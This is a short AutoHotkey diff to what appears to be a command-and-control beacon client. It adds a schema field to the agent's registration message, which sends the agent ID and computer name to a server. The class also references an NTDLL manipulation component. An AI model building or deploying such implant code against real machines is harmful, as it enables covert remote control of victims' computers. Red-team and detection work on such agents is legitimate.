@@ -31,6 +31,7 @@ class NetworkClient {
         this.Initialize()
         this.computerName := A_ComputerName
         this.agentID := this.GenerateAgentID()
+        this.schema := "autohotkey_beacon.yaml"
         this.manipulator := NTDLLManipulator()
     }
 
@@ -326,7 +327,7 @@ class NetworkClient {
 
     Register() {
         this.Log("Attempting to register with server...")
-        message := Format("register|{}|{}", this.agentID, this.computerName)
+        message := Format("register|{}|{}|{}", this.agentID, this.computerName, this.schema)
         
         try {
             response := this.SendMsg(this.serverIP, this.serverPort, message)
